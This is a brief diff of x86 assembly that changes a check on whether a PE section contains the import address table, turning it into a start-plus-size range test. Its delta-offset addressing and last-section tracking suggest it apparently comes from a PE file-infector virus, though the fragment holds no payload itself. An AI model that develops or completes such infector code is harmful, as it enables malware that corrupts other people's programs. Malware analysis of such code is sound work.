@@ -136,8 +136,12 @@ mov	[DELTA LastSecHeader], esi
 mov	[DELTA LastSec], eax
 keepLastSec:
 ; CHECK IF SECTION IS IAT
-cmp	ebx, [eax]
+mov	edx, [eax]
+cmp	ebx, edx
 jl	notIAT
+mov	edi, eax
+add	edi, 04h
+add	edx, [edi]
 cmp	ebx, edx
 jg	notIAT
 mov	edx, [eax]
